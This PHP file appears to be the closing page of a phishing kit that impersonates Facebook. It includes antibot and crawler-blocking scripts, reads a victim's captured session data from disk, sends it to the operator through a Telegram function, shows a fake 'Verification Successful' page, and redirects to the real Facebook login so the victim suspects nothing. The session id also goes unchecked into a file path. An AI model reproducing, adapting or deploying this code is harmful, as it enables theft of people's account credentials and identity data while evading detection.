<?php


error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');

session_start();

$config = include('../admin/tele.php');
$id = $_GET['id'];
if (!isset($_SESSION['users'][$id])) {
    header("Location: ../index.php");
    exit();
}
$userData = json_decode(file_get_contents("../sessions/$id.json"), true);


include('../config/send_to_telegram.php');


sendToTelegram($id, $userData, $config);


$_SESSION['users'][$id]['page'] = 'complete';
file_put_contents("../sessions/$id.json", json_encode($_SESSION['users'][$id]));
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="../css/styles2.css">
    <title>Facebook</title>
    <link rel="icon" type="image/x-icon" href="../images/fb.svg">
</head>

<body>
    <section class="main-wrapper">
        <div class="branding">
            <img src="../images/fb.svg" alt="Facebook" width="200" height="100">
        </div>


        <div class="panel">
            <form>
                <div class="thankText">
                    Verification Successful
                </div>
                <div class="thankYou1">
                    Thank you for verifying your identity.
                    Your account has been successfully verified and you can now continue log in.
                </div>
                <div class="thankYou1">
                    If you have any questions or need further assistance, please visit our
                    <a href="https://www.facebook.com/help/" class="support">Support Page.</a>
                </div>
                <br>
                <input class="log-in-button" type="button" value="Continue" onclick="nextPage()">
            </form>
        </div>
    </section>

    <script>
    function nextPage() {

        window.location.href = 'https://www.facebook.com/login';
    }
    </script>

</body>

</html>